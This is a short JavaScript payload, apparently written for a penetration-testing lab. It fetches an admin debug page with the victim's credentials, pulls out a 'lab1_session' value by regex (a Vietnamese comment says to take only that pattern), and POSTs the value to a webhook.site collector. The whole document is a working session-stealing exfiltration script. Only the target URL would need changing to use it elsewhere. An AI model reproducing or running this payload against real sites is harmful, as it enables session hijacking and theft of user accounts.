fetch('https://lab1.demo-pentest.pp.ua/admin/debug', {credentials:'include'})
.then(r => r.text())
.then(html => {
    // CHỈ lấy pattern lab1_session = "value"
    let match = html.match(/lab1_session\s*=\s*["']([^"']+)["']/i);
    
    if (match) {
        fetch('https://webhook.site/35072877-3640-41da-b949-6eb069d6e53c', {
            method: 'POST',
            mode: 'no-cors',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session: match[1]})
        });
    }
})
